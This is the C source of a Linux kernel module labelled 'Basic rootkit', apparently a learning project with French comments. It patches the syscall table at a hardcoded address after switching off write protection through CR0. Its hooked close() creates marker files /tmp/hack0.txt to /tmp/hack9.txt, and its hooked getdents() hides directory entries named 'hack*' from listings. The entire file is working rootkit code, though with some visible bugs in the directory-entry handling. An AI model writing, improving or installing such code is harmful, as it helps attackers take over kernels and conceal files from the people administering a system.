#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>


MODULE_AUTHOR("Antoine Rouquette");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Basic rootkit");

#define SYS_CALL_TABLE_ADDR 0xffffffff8fa00240
#define KALLSYMS_PATH       "/proc/kallsyms"
#define FILE_PATH           "/tmp/hack"
#define FILE_PATH_SIZE      9
#define FILE_BASENAME       "hack"
#define FILE_BASENAME_SIZE  4

struct linux_dirent 
{
    unsigned long   d_ino;      // Inode number.
    unsigned long   d_off;      // Offset of the next linux dirent.
    unsigned short  d_reclen;   // Length of this linux dirent.
    char            d_name[];   // Filename.
};

//How to find the syscall address and not in hardcoded
unsigned long * sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;

// Original functions
asmlinkage long (*original_sys_close) (unsigned int fd);
asmlinkage long (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);

/*  
 * File system, one layer deep into kernel
 * Donc, pour chaque fonction de userland, il faut voir son implementation et checker le niveau en dessous
 * */
 
 struct file *file_open(const char *path, int flags, int rights)
 {
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    // on stocke l'ancien filesystem ici
    oldfs  = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp))
    {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
 }
 
int file_close(struct file *file)
{
    return filp_close(file, NULL);
}
 
int file_read(struct file * file, unsigned long long offset, unsigned char * data, 
                   unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file * file, unsigned long long offset, unsigned char * data, 
                    unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file * file)
{
    vfs_fsync(file, 0);
    return 0;
}

// Finish editing some files here
 
asmlinkage long fake_sys_close(unsigned int fd)
{
    static char cnt = '0';
    char filename[64] = {'\0'};
    struct file * filp = NULL;

    if(cnt > '9')
		return original_sys_close(fd);

    memcpy(filename, FILE_PATH, FILE_PATH_SIZE);
    memset(&filename[FILE_PATH_SIZE], cnt, 1);
    memcpy(&filename[FILE_PATH_SIZE + 1], ".txt", 4);
    memset(&filename[FILE_PATH_SIZE + 5] , '\0', 1);
    filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
    if(filp)
    {
        printk("[%s] File : %s created!", __this_module.name, filename);
        file_close(filp);
        filp = NULL;
    }
    cnt++;

    return original_sys_close(fd);
}

asmlinkage long fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	// Get the relevant informations
	int nread = original_sys_getdents(fd, dirp, count);

    unsigned long 			bpos 		= 0;
    unsigned int 			lost_data 	= 0;
    char 					* buf;
    char 					d_type;
    struct linux_dirent *	dir;		
    struct linux_dirent *	prev;		
    
    buf = (char*)dirp;

    if(nread < 0)
    {
        printk("[%s] Error getdents", __this_module.name);
        return nread;
    }
    else if(nread == 0)
    {
        printk("[%s] empty dir", __this_module.name);
        return nread;
    }
        
	printk("--------------- nread=%d ---------------\n", nread);
	printk("inode#    file type  d_reclen  d_off   d_name\n");
	prev = (struct linux_dirent *)(buf);

	for(bpos = 0; bpos < nread;)
	{
		dir = (struct linux_dirent *)(buf + bpos);
		
		printk("%8ld    ", dir->d_ino);
		d_type = (buf + bpos + dir->d_reclen - 1);
		printk("%-10s ", (d_type == DT_REG) ?  "regular" :
                                    (d_type == DT_DIR) ?  "directory" :
                                    (d_type == DT_FIFO) ? "FIFO" :
                                    (d_type == DT_SOCK) ? "socket" :
                                    (d_type == DT_LNK) ?  "symlink" :
                                    (d_type == DT_BLK) ?  "block dev" :
                                    (d_type == DT_CHR) ?  "char dev" : "???");
		printk("%4d %10lld  %s\n", dir->d_reclen,
                           (long long) dir->d_off, dir->d_name);
                   bpos += dir->d_reclen;

		if(strlen(dir->d_name) > 3)
		{
			// Shit, we get the file of the same name, hide it, is it 1st element!
			if(!memcmp(dir->d_name, "hack", 4))
			{
				printk("hidding file %s", dir->d_name);
				lost_data = dir->d_reclen - prev->d_reclen;
				prev->d_reclen += dir->d_reclen;
			}
			else
			{
				prev = dir;
			}
		}

	}

    return nread - lost_data;
}

static int __init lkm_init(void)
{
    original_sys_close      = sys_call[__NR_close];
    original_sys_getdents   = sys_call[__NR_getdents];
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_close]    = fake_sys_close;
    sys_call[__NR_getdents] = fake_sys_getdents;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
    printk("[%s] hardcoded syscall table address : 0x%p.\n", __this_module.name, sys_call);
    return 0;
}

static void __exit lkm_exit(void)
{
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_close] = original_sys_close;
    sys_call[__NR_getdents] = original_sys_getdents;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module unloaded.\n", __this_module.name);
}

// how to find the syscall table in this case

module_init(lkm_init);
module_exit(lkm_exit);
